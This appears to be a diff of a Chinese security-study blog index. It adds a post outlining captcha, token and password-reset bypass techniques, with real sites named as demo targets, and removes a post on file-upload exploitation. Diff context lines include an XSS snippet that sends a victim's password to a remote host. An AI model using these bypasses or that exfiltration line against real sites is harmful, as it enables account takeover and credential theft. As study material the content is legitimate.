@@ -64,6 +64,51 @@
       <div class="outer">
         <section id="main">
   
+    <article id="post-逻辑越权漏洞-验证码和token安全及找回机制" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2021/11/21/%E9%80%BB%E8%BE%91%E8%B6%8A%E6%9D%83%E6%BC%8F%E6%B4%9E-%E9%AA%8C%E8%AF%81%E7%A0%81%E5%92%8Ctoken%E5%AE%89%E5%85%A8%E5%8F%8A%E6%89%BE%E5%9B%9E%E6%9C%BA%E5%88%B6/" class="article-date">
+  <time datetime="2021-11-21T07:59:26.000Z" itemprop="datePublished">2021-11-21</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2021/11/21/%E9%80%BB%E8%BE%91%E8%B6%8A%E6%9D%83%E6%BC%8F%E6%B4%9E-%E9%AA%8C%E8%AF%81%E7%A0%81%E5%92%8Ctoken%E5%AE%89%E5%85%A8%E5%8F%8A%E6%89%BE%E5%9B%9E%E6%9C%BA%E5%88%B6/">逻辑越权漏洞-验证码和token安全及找回机制</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h4 id="验证码安全"><a href="#验证码安全" class="headerlink" title="验证码安全"></a>验证码安全</h4><h5 id="利用形式"><a href="#利用形式" class="headerlink" title="利用形式"></a>利用形式</h5><p>1、爆破   字典暴力破解<br>2、识别<br>3、复用<br>4、回显<br>5、绕过</p>
+<p>常见类型：图片，手机或邮箱，语音，操作等<br>危害：权限泄漏，短信轰炸，恶意注册，任意用户操作等</p>
+<h5 id="验证码识别插件工具使用"><a href="#验证码识别插件工具使用" class="headerlink" title="验证码识别插件工具使用"></a>验证码识别插件工具使用</h5><p>Pkav_Http_Fuzz , captcha-killer、打码平台等</p>
+<h4 id="token-安全"><a href="#token-安全" class="headerlink" title="token 安全"></a>token 安全</h4><p>验证中可存在绕过可继续后续测试<br>token 爆破，token客户端回显等</p>
+<h5 id="利用形式-1"><a href="#利用形式-1" class="headerlink" title="利用形式"></a>利用形式</h5><p>1、爆破<br>2、本地回显</p>
+<h4 id="找回重置机制"><a href="#找回重置机制" class="headerlink" title="找回重置机制"></a>找回重置机制</h4><p>客户端回显，Response 状态值，验证码爆破，找回流程绕过</p>
+<p>客户端回显：通过抓包或者浏览器找得到验证码<br>Response状态值：修改状态值进行绕过客户端验证<br>验证码爆破：通过暴力破解<br>找回流程绕过：跳过安全验证得步骤</p>
+<h4 id="实验"><a href="#实验" class="headerlink" title="实验"></a>实验</h4><p> 验证码识别插件及工具操作演示     <a target="_blank" rel="noopener" href="http://www.isaipu.net/manage/login">http://www.isaipu.net/manage/login</a><br> 验证码绕过本地演示-pikachu<br> Token回显绕过登录爆破演示-pikachu<br>手机邮箱验证码逻辑-客户端回显<br>找回密码验证码逻辑-爆破测试<br> 绑定手机验证码逻辑-状态值篡改-实例   福利期货APP演示  <a target="_blank" rel="noopener" href="https://my.pcauto.com.cn/">https://my.pcauto.com.cn/</a></p>
+<h4 id="涉及资源"><a href="#涉及资源" class="headerlink" title="涉及资源"></a>涉及资源</h4><p><a target="_blank" rel="noopener" href="http://downcode.com/downcode/j_16621.shtml">http://downcode.com/downcode/j_16621.shtml</a>   PHP云人才系统3.2源码下载<br><a target="_blank" rel="noopener" href="http://www.pc6.com/az/621330.html">http://www.pc6.com/az/621330.html</a>  福利期货APP下载<br><a target="_blank" rel="noopener" href="https://www.cnblogs.com/hy627/p/14230099.html">https://www.cnblogs.com/hy627/p/14230099.html</a>  重置密码之验证流程防绕过<br><a target="_blank" rel="noopener" href="https://pan.baidu.com/s/12gMVx4DK-ATTANBWpkmK0w">https://pan.baidu.com/s/12gMVx4DK-ATTANBWpkmK0w</a>  提取码:qx2c     Pkav_Http_Fuzz工具下载<br><a target="_blank" rel="noopener" href="https://www.cnblogs.com/cwkiller/p/12659549.html">https://www.cnblogs.com/cwkiller/p/12659549.html</a>     使用burp插件captcha-killer识别图片验证码<br><a target="_blank" rel="noopener" href="https://github.com/c0ny1/captcha-killer/releases/tag/0.1.2">https://github.com/c0ny1/captcha-killer/releases/tag/0.1.2</a>    captcha-killer插件下载<br><a target="_blank" rel="noopener" href="https://www.cnblogs.com/yufusec/p/9179625.html">https://www.cnblogs.com/yufusec/p/9179625.html</a>    Burpsuite模块—-Intruder模块详解</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://yoursite.com/2021/11/21/%E9%80%BB%E8%BE%91%E8%B6%8A%E6%9D%83%E6%BC%8F%E6%B4%9E-%E9%AA%8C%E8%AF%81%E7%A0%81%E5%92%8Ctoken%E5%AE%89%E5%85%A8%E5%8F%8A%E6%89%BE%E5%9B%9E%E6%9C%BA%E5%88%B6/" data-id="ckw8yh26w0019jovj782wf8nc" class="article-share-link">Share</a>
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+  
     <article id="post-逻辑越权漏洞—-各种越权和数据篡改" class="article article-type-post" itemscope itemprop="blogPost">
   <div class="article-meta">
     <a href="/2021/11/16/%E9%80%BB%E8%BE%91%E8%B6%8A%E6%9D%83%E6%BC%8F%E6%B4%9E%E2%80%94-%E5%90%84%E7%A7%8D%E8%B6%8A%E6%9D%83%E5%92%8C%E6%95%B0%E6%8D%AE%E7%AF%A1%E6%94%B9/" class="article-date">
@@ -103,7 +148,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2021/11/16/%E9%80%BB%E8%BE%91%E8%B6%8A%E6%9D%83%E6%BC%8F%E6%B4%9E%E2%80%94-%E5%90%84%E7%A7%8D%E8%B6%8A%E6%9D%83%E5%92%8C%E6%95%B0%E6%8D%AE%E7%AF%A1%E6%94%B9/" data-id="ckw24ym30001ai4vj898r9zrl" class="article-share-link">Share</a>
+      <a data-url="http://yoursite.com/2021/11/16/%E9%80%BB%E8%BE%91%E8%B6%8A%E6%9D%83%E6%BC%8F%E6%B4%9E%E2%80%94-%E5%90%84%E7%A7%8D%E8%B6%8A%E6%9D%83%E5%92%8C%E6%95%B0%E6%8D%AE%E7%AF%A1%E6%94%B9/" data-id="ckw8yh281001bjovjf8mpennb" class="article-share-link">Share</a>
       
       
     </footer>
@@ -157,7 +202,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2021/11/11/%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C%E4%B9%8B%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E8%AF%BB%E5%8F%96/" data-id="ckw24ym2y0016i4vjc0cn15tr" class="article-share-link">Share</a>
+      <a data-url="http://yoursite.com/2021/11/11/%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C%E4%B9%8B%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E8%AF%BB%E5%8F%96/" data-id="ckw8yh26t0014jovj5uy708fk" class="article-share-link">Share</a>
       
       
     </footer>
@@ -214,7 +259,7 @@ echo system($code);
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2021/11/04/RCE%E4%BB%A3%E7%A0%81%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" data-id="ckw24ym260004i4vj52iu3vj7" class="article-share-link">Share</a>
+      <a data-url="http://yoursite.com/2021/11/04/RCE%E4%BB%A3%E7%A0%81%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" data-id="ckw8yh2620005jovj0ch3hrv5" class="article-share-link">Share</a>
       
       
     </footer>
@@ -279,7 +324,7 @@ curl_close($ch);
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2021/11/01/CSRF%E5%92%8CSSRF%E6%BC%8F%E6%B4%9E/" data-id="ckw24ym1x0000i4vj9unff6p8" class="article-share-link">Share</a>
+      <a data-url="http://yoursite.com/2021/11/01/CSRF%E5%92%8CSSRF%E6%BC%8F%E6%B4%9E/" data-id="ckw8yh25p0000jovjdfx45j1n" class="article-share-link">Share</a>
       
       
     </footer>
@@ -327,7 +372,7 @@ curl_close($ch);
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2021/10/29/xss%E6%BC%8F%E6%B4%9E-%E8%BF%87%E6%BB%A4%E7%BB%95%E8%BF%87%E5%8F%8A%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/" data-id="ckw24ym2p000ti4vj3x4v5ofn" class="article-share-link">Share</a>
+      <a data-url="http://yoursite.com/2021/10/29/xss%E6%BC%8F%E6%B4%9E-%E8%BF%87%E6%BB%A4%E7%BB%95%E8%BF%87%E5%8F%8A%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/" data-id="ckw8yh26j000rjovj1xx9c6zj" class="article-share-link">Share</a>
       
       
     </footer>
@@ -380,7 +425,7 @@ echo "<script src='http://192.168.80.1/api.asp?url=$url&pass=$password'>";
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2021/10/26/xss%E6%BC%8F%E6%B4%9E-%E5%9F%BA%E7%A1%80%E5%88%86%E7%B1%BB%E5%8F%8A%E5%88%A9%E7%94%A8/" data-id="ckw24ym2n000qi4vj4deb5i9t" class="article-share-link">Share</a>
+      <a data-url="http://yoursite.com/2021/10/26/xss%E6%BC%8F%E6%B4%9E-%E5%9F%BA%E7%A1%80%E5%88%86%E7%B1%BB%E5%8F%8A%E5%88%A9%E7%94%A8/" data-id="ckw8yh26i000qjovj86k05abv" class="article-share-link">Share</a>
       
       
     </footer>
@@ -424,7 +469,7 @@ echo "<script src='http://192.168.80.1/api.asp?url=$url&pass=$password'>";
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2021/10/23/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E-%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E/" data-id="ckw24ym2r000yi4vjb25t14dc" class="article-share-link">Share</a>
+      <a data-url="http://yoursite.com/2021/10/23/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E-%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E/" data-id="ckw8yh26r0010jovjeo5zfzz1" class="article-share-link">Share</a>
       
       
     </footer>
@@ -469,7 +514,7 @@ echo "<script src='http://192.168.80.1/api.asp?url=$url&pass=$password'>";
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2021/10/20/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E7%9A%84%E4%B8%8A%E4%BC%A0%E9%80%BB%E8%BE%91%E5%AE%89%E5%85%A8/" data-id="ckw24ym2u000zi4vjhii07x69" class="article-share-link">Share</a>
+      <a data-url="http://yoursite.com/2021/10/20/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E7%9A%84%E4%B8%8A%E4%BC%A0%E9%80%BB%E8%BE%91%E5%AE%89%E5%85%A8/" data-id="ckw8yh26r0011jovjbbz7alge" class="article-share-link">Share</a>
       
       
     </footer>
@@ -522,52 +567,7 @@ echo "<script src='http://192.168.80.1/api.asp?url=$url&pass=$password'>";
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2021/10/16/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E7%9A%84%E5%90%8E%E7%AB%AF%E7%BB%95%E8%BF%87%E6%96%B9%E6%B3%95/" data-id="ckw24ym2w0013i4vj0vag8ai4" class="article-share-link">Share</a>
-      
-      
-    </footer>
-  </div>
-  
-</article>
-
-
-  
-    <article id="post-文件上传漏洞的利用和验证过滤" class="article article-type-post" itemscope itemprop="blogPost">
-  <div class="article-meta">
-    <a href="/2021/10/11/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E7%9A%84%E5%88%A9%E7%94%A8%E5%92%8C%E9%AA%8C%E8%AF%81%E8%BF%87%E6%BB%A4/" class="article-date">
-  <time datetime="2021-10-11T12:35:57.000Z" itemprop="datePublished">2021-10-11</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2021/10/11/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E7%9A%84%E5%88%A9%E7%94%A8%E5%92%8C%E9%AA%8C%E8%AF%81%E8%BF%87%E6%BB%A4/">文件上传漏洞的利用和验证过滤</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h4 id="什么是文件上传漏洞"><a href="#什么是文件上传漏洞" class="headerlink" title="什么是文件上传漏洞"></a>什么是文件上传漏洞</h4><p>文件上传漏洞是指由于程序员未对上传的文件进行严格的验证和过滤,而导致的用户可以越过其本身权限向服务器上上传可执行的动态脚本文件。</p>
-<h4 id="文件上传漏洞有哪些危害"><a href="#文件上传漏洞有哪些危害" class="headerlink" title="文件上传漏洞有哪些危害"></a>文件上传漏洞有哪些危害</h4><p>这里上传的文件可以是木马,病毒,恶意脚本或者WebShell等。这种攻击方式是最为直接和有效的，获取权限</p>
-<h4 id="文件上传漏洞如何查找及判断"><a href="#文件上传漏洞如何查找及判断" class="headerlink" title="文件上传漏洞如何查找及判断"></a>文件上传漏洞如何查找及判断</h4><p>明确功能点具有上传功能<br>1、黑盒测试-不知道对方源码其他信息得情况下进行测试<br>    对功能点进行测试<br>    根据公开漏洞<br>2、白盒测试-知道对方源码得情况下进行代码审计</p>
-<h4 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h4><h5 id="①常规类"><a href="#①常规类" class="headerlink" title="①常规类"></a>①常规类</h5><p>​    a)扫描获取上传<br>​    b)会员中心上传<br>​    c)后台系统上传<br>​    d)各种途径上传</p>
-<h5 id="②CMS类–根据已知CMS源码"><a href="#②CMS类–根据已知CMS源码" class="headerlink" title="②CMS类–根据已知CMS源码"></a>②CMS类–根据已知CMS源码</h5><h5 id="③编辑器类"><a href="#③编辑器类" class="headerlink" title="③编辑器类"></a>③编辑器类</h5><p>​    a)Ckeditor<br>​    b)Fckeditor<br>​    c)Kindeditor<br>​    d)xxxxeditor</p>
-<h5 id="④其他类-CVE"><a href="#④其他类-CVE" class="headerlink" title="④其他类/CVE"></a>④其他类/CVE</h5><p>​    a)代码审计<br>​    b)平台/三方应用等</p>
-<h4 id="前端验证和后端验证"><a href="#前端验证和后端验证" class="headerlink" title="前端验证和后端验证"></a>前端验证和后端验证</h4><p>前端验证是运行在本地，可以人工绕过，比如浏览器禁用js<br>后端验证是前端数提交到服务器上进行验证</p>
-<h4 id="案例"><a href="#案例" class="headerlink" title="案例"></a>案例</h4><p>①常规文件上传地址的获取    inurl:upload.php<br>②不同格式下的文件类型后门测试<br>      配合解析漏洞下的文件类型后门测试<br>③本地文件上传漏洞靶场环境搭建测试<br>④finecms_v5文件上传漏洞测试<br>      Weblogic任意文件上传漏洞(CVE-2018-2894) </p>
-<h4 id="涉及资源"><a href="#涉及资源" class="headerlink" title="涉及资源"></a>涉及资源</h4><p><a target="_blank" rel="noopener" href="https://github.com/c0ny1/upload-labs">https://github.com/c0ny1/upload-labs</a><br><a target="_blank" rel="noopener" href="https://pan.baidu.com/s/1h2_1gZN6V_vCou9fDwOEBg">https://pan.baidu.com/s/1h2_1gZN6V_vCou9fDwOEBg</a>  提取码：1111    finecms_v5.0源码</p>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://yoursite.com/2021/10/11/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E7%9A%84%E5%88%A9%E7%94%A8%E5%92%8C%E9%AA%8C%E8%AF%81%E8%BF%87%E6%BB%A4/" data-id="ckw24ym2x0015i4vjbzqs67tu" class="article-share-link">Share</a>
+      <a data-url="http://yoursite.com/2021/10/16/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E7%9A%84%E5%90%8E%E7%AB%AF%E7%BB%95%E8%BF%87%E6%96%B9%E6%B3%95/" data-id="ckw8yh26t0013jovjf38k6ub7" class="article-share-link">Share</a>
       
       
     </footer>
@@ -613,6 +613,10 @@ echo "<script src='http://192.168.80.1/api.asp?url=$url&pass=$password'>";
       <ul>
         
           <li>
+            <a href="/2021/11/21/%E9%80%BB%E8%BE%91%E8%B6%8A%E6%9D%83%E6%BC%8F%E6%B4%9E-%E9%AA%8C%E8%AF%81%E7%A0%81%E5%92%8Ctoken%E5%AE%89%E5%85%A8%E5%8F%8A%E6%89%BE%E5%9B%9E%E6%9C%BA%E5%88%B6/">逻辑越权漏洞-验证码和token安全及找回机制</a>
+          </li>
+        
+          <li>
             <a href="/2021/11/16/%E9%80%BB%E8%BE%91%E8%B6%8A%E6%9D%83%E6%BC%8F%E6%B4%9E%E2%80%94-%E5%90%84%E7%A7%8D%E8%B6%8A%E6%9D%83%E5%92%8C%E6%95%B0%E6%8D%AE%E7%AF%A1%E6%94%B9/">逻辑越权漏洞—-各种越权和数据篡改</a>
           </li>
         
@@ -626,10 +630,6 @@ echo "<script src='http://192.168.80.1/api.asp?url=$url&pass=$password'>";
         
           <li>
             <a href="/2021/11/01/CSRF%E5%92%8CSSRF%E6%BC%8F%E6%B4%9E/">CSRF</a>
-          </li>
-        
-          <li>
-            <a href="/2021/10/29/xss%E6%BC%8F%E6%B4%9E-%E8%BF%87%E6%BB%A4%E7%BB%95%E8%BF%87%E5%8F%8A%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/">xss漏洞-过滤绕过及工具使用</a>
           </li>
         
       </ul>
